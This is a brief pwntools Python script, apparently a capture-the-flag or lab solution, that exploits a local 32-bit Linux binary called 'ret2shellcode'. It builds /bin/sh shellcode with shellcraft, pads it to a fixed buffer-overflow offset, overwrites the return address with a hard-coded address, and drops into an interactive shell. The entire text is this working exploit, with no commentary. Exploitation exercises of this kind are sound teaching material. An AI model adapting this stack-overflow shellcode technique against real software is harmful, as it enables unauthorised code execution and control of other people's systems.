from pwn import *

context.arch = 'i386'
context.os = 'linux'

sh = process("./ret2shellcode")
sh.recvuntil("No system for you this time !!!\n")
offset = 0x6c + 4
ret_addr = 0x804A080
shellcode = asm(shellcraft.sh())
payload = shellcode.ljust(offset, b'\x90') + p32(ret_addr)

sh.sendline(payload)
sh.interactive()